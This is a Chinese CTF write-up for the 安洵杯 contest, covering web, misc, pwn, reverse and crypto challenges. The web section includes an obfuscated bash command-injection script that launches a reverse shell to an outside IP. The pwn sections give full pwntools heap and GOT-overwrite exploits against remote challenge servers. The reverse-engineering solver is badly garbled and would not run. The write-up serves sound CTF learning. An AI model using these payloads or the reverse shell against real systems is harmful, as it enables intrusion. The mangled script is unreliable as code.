---
title: "安洵杯部分WP-安全KER - 安全资讯平台"
source: "https://www.anquanke.com/post/id/223786"
author:
published:
created: 2026-06-09
description: "安全KER - 安全资讯平台"
tags:
  - "clippings"
---
---
title: "安洵杯部分WP-安全KER - 安全资讯平台"
source: "https://www.anquanke.com/post/id/223786"
author: ""
published: ""
created: "2026-06-09T21:07:57+08:00"
description: "安全KER - 安全资讯平台"
tags: [clippings]
---

# 安洵杯部分WP-安全KER - 安全资讯平台

首页

活动

社区

学院

安全导航

[![](https://p0.ssl.qhimg.com/t01103704213901dd1e.png)](https://www.anquanke.com/app)

## 安洵杯部分WP

阅读量 **441454**

|

![](https://p1.ssl.qhimg.com/t01327decd7bbe646d5.jpg)

## web

### web1

有一道很像题目直接拿脚本了  
[https://ddaa.tw/34c3ctf\_2017\_misc\_162\_minbashmaxfun.html](https://ddaa.tw/34c3ctf_2017_misc_162_minbashmaxfun.html)

```swift
import requests
import sys

url = "http://47.108.162.43:30025/"
def send_cmd(cmd):
    #r = remote("35.198.107.77", 1337)

    payload = build_payload(cmd)
    data = {
        "cmd":payload
    }

    req= requests.post(url,data=data)
    print(req.text)
   # print("payload is: {}".format(payload.decode()))

    #while nextpid(r) != 53:
    #    pass

    #print("sending exploit")
    #r.sendline(payload)
    #r.interactive()

def nextpid(r):
    r.sendline(b"$$")
    r.readuntil(b"bash: ")
    pid = int(r.readuntil(b":")[:-1], 10)
    print("current pid: {}".format(pid))
    r.readline()
    return pid + 1

base_payload = rb"${0}<<<${0}\<\<\<${0}\\\<\\\<\\\<${0}\\\\\\\<\\\\\\\<\\\\\\\<\\\\\\\$\\\\\\\'"
base_payload_end = rb"\\\\\\\'"

def build_payload(string):
    bstr = string.encode()
    payload = base_payload
    for char in bstr:
        payload += encode_character(char)
    payload += base_payload_end
    return payload

def encode_character(byte):
    octals = "{:o}".format(byte)
    payload = rb"\\\\\\\\"
    for octal in octals:
        num = int(octal, 8)
        if num == 0:
            payload += rb"$#"
        elif num == 1:
            payload += rb"${##}"
        else:
            payload += rb"\\\$\\\(\\\(" 
            payload += rb"\$\'\\$$\'".join([rb"${##}" for i in range(num)])
            payload += rb"\\\)\\\)"
    return payload

#while True:
cmd = "bash -i >& /dev/tcp/81.70.154.76/2333 0>&1" 
send_cmd(cmd)
```

![](https://p1.ssl.qhimg.com/t0154c60624c0334a7b.png)

## misc

### 签到

公众号回复flag

### 王牌特工

取证大师发现提示 Veracrypt挂载以及密码  
flagbox直接挂载拿flag就行了

### Misc3

CRC爆破拿到密码  
伪加密拿到redeme.txt  
然后直接明文发现问题  
先删除flag.txt  
之后再恢复密码

![](https://p2.ssl.qhimg.com/t01680f679753935afd.png)

之后再重新开包

### Misc4

txt打开感觉有隐写  
想到零宽度  
RealV1siBle  
图片拿到，测了一堆隐写无用  
开始看题目描述发现eye  
直接Silenteye  
拿到flag

## pwn

### Einstein

登录错误释放空间，得到main\_arena+88地址，密码错误泄露libc，再用one打exit即可

```python
from pwn import *
import subprocess, sys, os
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)

elf_path = './sfs'
ip = 'axb.d0g3.cn'
port = 20103
remote_libc_path = './libc-2.23.so'

context(os='linux', arch='amd64')
context.log_level = 'debug'

local = 0
if local == 1:
    p = process(elf_path)
else:
    p = remote(ip, port)

def debug(cmd):
    gdb.attach(p,cmd)
    pause()

def one_gadget(filename = remote_libc_path):
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

payload = '{"name":{"123":"456"},"passwd":{"123":"456"}}'
sla('Please input your name and passwd.', payload)

main_88 = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc = main_88 - 88 - 0x10 - 0x3C4B10 + 8
hook = libc + 0x8f9f48
success('0x%x'%libc)
one = one_gadget()
one = libc + one[3]
print hex(one)
one = p64(one)

p.send(p64(hook))
p.send(one[0])
p.send(p64(hook + 1))
p.send(one[1])
p.send(p64(hook + 2))
p.send(one[2])

p.interactive()
p.close()
```

### IO\_FILE

打free为puts泄露libc，打free为one拿shell

```python
#coding:utf-8

from pwn import *
import subprocess, sys, os
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)

elf_path = './IO_FILE'
ip = 'axb.d0g3.cn'
port = 20102
remote_libc_path = './libc.so.6'

context(os='linux', arch='amd64')
context.log_level = 'debug'

local = 0
if local == 1:
    p = process(elf_path)
else:
    p = remote(ip, port)

def debug(cmd):
    gdb.attach(p,cmd)
    pause()

def one_gadget(filename = remote_libc_path):
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def chose(idx):
    sla('>', str(idx))
def add(size = 0x68, content = '\n'):
    chose(1)
    sla('size:', str(size))
    sa('description:', content)
def free(idx):
    chose(2)
    sla('index:', str(idx))

add()
add(0xff)
add(0x78)
add(0x10)
for i in range(7):
    free(1)
free(0)
free(0)
free(0)
free(2)
free(2)
free(2)
puts = 0x400640
free_got = 0x602018
set_got = 0x602040
main = 0x400a78
add(0x68, p64(free_got))
add(0x68, '/bin/sh\x00')
free(1)
free(3)
add(0x68, p64(puts))
free(1)
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x10 - 0x3B4C30
'''
free(3)
add(0x68, p64(free_got))
add(0x68, '/bin/sh\x00')
add(0x68, p64(main))
free(3)
'''
success('0x%x'%libc)
one = one_gadget()
one = libc + one[2]
sys = libc + 0x3B68E8
free_hook = libc + 0x3B68E8
add(0x78, p64(free_got))
add(0x78, '/bin/sh\x00')
add(0x78, p64(one))
free(8)

p.interactive()
p.close()
```

### web-server

WEB题，目录穿越。

## Re

### Re1

- 拖到 die 里发现无壳，但是发现一个自己构造的段.cyzcc
- 在 IDA 里看一眼，发现输入被保存到了这个地方
- 看一眼 data 段里有什么，大概比较重要的是如下几个东西
- 看一下字符串，发现输出的东西都是下面这个函数打印的
- 然而 strcmp 比较的两个都不是输入，考虑是加密了之后存到了另外一个地方
- str1 本来就有东西，交叉引用看一下它啥时候被修改的，发现应该是在原有的东西上又亦或加密了一层
- str2是空的，而且在这被用做过函数的参数，同样作为参数的还有输入的字符串
- 调用的函数是个自解密的函数，于是乎掏出我的大 od ，下个断点
- 加密过程如图所示
- 算是魔改的b64加密吧，但是码表不早为啥一直是空的，卡了好久，后来想到 ida 里能看到计算码表的过程
- 加密完之后跟gJZSOdhLOfSHjTZ0beYRQflLQfkllkhD比较
- 但还是挺奇怪的，加密的字符串里面有俩字符码表里没有。。。不知道是出题人的恶意还是我有地方没看到。。。算了，猜一下吧

解题脚本如下

```python
array = [0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11,
        0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B,
        0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x07, 0x08, 0x09, 0x0A,
        0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14,
        0x15, 0x16, 0x17, 0x18, 0x19, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE,
        0xFF, 0x00, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD,
        0xBE, 0xBF, 0xB1, 0xB5
    ]
cipher = [35, 122, 61, 96, 52, 7, 17, 54, 44, 5,
    12, 32, 11, 34, 63, 111, 22, 0, 55, 13,
    54, 15, 30, 32, 55, 20, 2, 9, 2, 15,
    27, 57
]
dog = [68, 48, 103, 51, 123, 99, 121, 122, 99, 99,
    95, 104, 97, 118, 101, 95, 116, 101, 110, 95,
    103, 105, 114, 108, 102, 114, 105, 101, 110, 100,
    115, 125
]
for i in range(len(array)):
    if i >= 26:
    if i >= 45:
    array[i] += 122
else :
    array[i] += 90
else :
    array[i] += 57
for i in range(32):
    cipher[i] = cipher[i] ^ dog[i]
print(‘’.join([chr(n) for n in cipher]))
all_guess = []
for guess2 in range(64):
    for guess1 in range(64):
    this_guess = ’’
    for n in range(32 //4):
        arr = array[n + 1: ] def get_index(c0):
        try:
        return arr.index(c0)
        except:
        if c0 == 48:
        return guess1
        else :
            return guess2
        try:

        l = cipher[n * 4: n * 4 + 4] c = [get_index(n) for n in l] p = [0] * 3 p[0] = ((0x30 & c[0]) << 2) + (0x3 & c[1]) + \
        ((0xc & c[2]) << 2) + ((0x30 & c[3]) >> 2) p[1] = ((0x30 & c[1]) << 2) + ((0xc & c[0]) << 2) + (0xc & c[3]) + (0x03 & c[2]) p[2] = ((0x30 & c[2]) << 2) + ((0xc & c[1]) << 2) + \
        ((0x3 & c[3]) << 2) + (0x3 & c[0]) this_guess += ''.join([chr(n) for n in p]) except:
        pass all_guess.append(this_guess) for g in allguess:
        g: str
        if g.count(“
        }”) == 1 and g[-1] == ”
}”
and g[-2] == ”y”:
    flag = True
for c in g:
    if c.isalnum() or c in ”{}”:
    continue
else :
    flag = False
if flag:
    print(g)
```

从输出挑了几个顺眼的，下图的这个对了

### cry1

```python
import hashlib
plaintext='1234567890abcdef'
l=len(plaintext)
for i in range(l):
    for j in range(l):
        for k in range(l):
            for n in range(l):
                for t in range(l):
                    for s in range(l):
                        str="d0g3{{71b2b5616{}{}2a4639{}{}7d979{}{}de964c}}".format(plaintext[i],plaintext[j],plaintext[k],plaintext[n],plaintext[t],plaintext[s])
                        if hashlib.sha256(str.encode('utf-8')).hexdigest()=="0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a":
                            print(str)
```

d0g3{71b2b5616ee2a4639a07d979ebde964c}

### cry2

key和hint位数不一致，通过异或高位得到hint，从而得到key，然后反向恢复cbc即可

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES

hint = 56631233292325412205528754798133970783633216936302049893130220461139160682777
msg = b'Welcome to this competition, I hope you can have fun today!!!!!!'
r = long_to_bytes(hint)[:4] * 8
key = long_to_bytes(bytes_to_long(r) ^ hint)
print(key)

aes=AES.new(key,AES.MODE_ECB)

tmp = long_to_bytes(0x3c976c92aff4095a23e885b195077b66)
for i in range(4, 0, -1):
    tmp = aes.decrypt(tmp)
    tmp = long_to_bytes(bytes_to_long(tmp) ^ bytes_to_long(msg[16*(i-1):16*i]))
print(tmp)
```

### cry3

chall1直接通过hint1得到明文平方，开方即可得到m，然后分解得到hint2，得到flag高位后CopperSmith即可

```python
from Crypto.Util.number import *
from gmpy2 import *

# chall1
n = 
c = 
hint1 = 

m = int(isqrt(pow(c, hint1, n)))

# chall2
n = 
p = 
c = 
q = n//p//m
e = 0x10001
assert n == p * q * m
phi = (p-1)*(q-1)*(m//3-1) * 2
assert gcd(phi, e) == 1
print(long_to_bytes(pow(c, inverse(e, phi), n)))

# chall3
n = 
c = 

m_high = 
e = 5
R.<x> = PolynomialRing(Zmod(n))

f = (m_high * (10**54)+ x) ** 5 - c

solve = f.monic().small_roots(X=2 ^ 200, beta=1)
x = solve[0]
flag = (m_high * (10**54)+ x)
print(long_to_bytes(flag))
```

本文由 **Retr\_0** 原创发布

转载，请参考 [转载声明](https://www.anquanke.com/note/repost) ，注明出处： [https://www.anquanke.com/post/id/223786](https://www.anquanke.com/post/id/223786)

安全KER - 有思想的安全新媒体

- [CTF](https://www.anquanke.com/tag/CTF)

10赞

收藏

Retr\_0

## 推荐阅读

- ![](https://p3.ssl.qhimg.com/sdm/229_160_100/t11fd941d71037eeb71d9498c0b.jpg)
	##### [AI安全网关：企业统一接入、安全防护与数据安全的必要性与实践路径](https://www.anquanke.com/post/id/315578)
	2026-05-28 16:40:39
- ![](https://p1.ssl.qhimg.com/sdm/229_160_100/t11fd941d71314c75005646f9f2.jpg)
	##### [借一个简单AI靶场初步了解提示词注入](https://www.anquanke.com/post/id/315584)
	2026-05-28 16:36:24
- ![](https://p3.ssl.qhimg.com/sdm/229_160_100/t11fd941d71730d4074db4f5c77.png)
	##### [瑞数信息入选IDC《中国智能体威胁检测技术评估，2026》](https://www.anquanke.com/post/id/315562)
	2026-05-21 15:21:53
- ![](https://p0.ssl.qhimg.com/sdm/229_160_100/t11fd941d710d37a414b5c847b4.png)
	##### [GitHub 被黑，3800个内部仓库外泄：从一枚恶意VS Code扩展说起](https://www.anquanke.com/post/id/315560)
	2026-05-21 10:11:45

![](https://p3.ssl.qhimg.com/t010e8708f79484c76d.png)

[Retr\_0](https://www.anquanke.com/member.html?memberId=154619)

这个人太懒了，签名都懒得写一个

- 文章
- **24**
- 粉丝
- **29**

### TA的文章

- ##### 上海市大学生大赛 Writeup
	2021-11-08 15:31:52
- ##### ByteCTF
	2021-10-26 15:30:07
- ##### 绿城杯
	2021-10-11 14:30:04
- ##### 第五空间CTF 初赛wp
	2021-09-29 15:30:39
- ##### 长城杯 wp
	2021-09-26 10:30:38

### 相关文章

- ##### 2024字节跳动“安全范儿”高校挑战赛报名开启！CTF、AI、HACK三大赛道等你来战！
	2024-08-30 14:39:48
- ##### 培养云上安全人才 | 阿里云2023首届CTF大赛重磅启动
	2023-04-24 19:17:46
- ##### Ichunqiu云境 —— Exchange Writeup
	2023-03-03 14:30:36
- ##### Ichunqiu云境 - Delegation Writeup
	2023-01-06 10:30:50
- ##### Ichunqiu云境 —— Tsclient Writeup
	2023-01-05 10:30:31
- ##### 活动 | 长亭科技2023第五届 Real World CTF 战火已燃，等你来战！
	2022-12-21 17:00:34
- ##### 从一道题入门 UEFI PWN
	2022-11-11 15:30:05

### 热门推荐

- [![热门推荐](https://p0.ssl.qhimg.com/sdm/386_200_100/t11fd941d717c3829f891c8d65f.png)](https://www.anquanke.com/subject/id/307858)

商务合作

内容需知

合作单位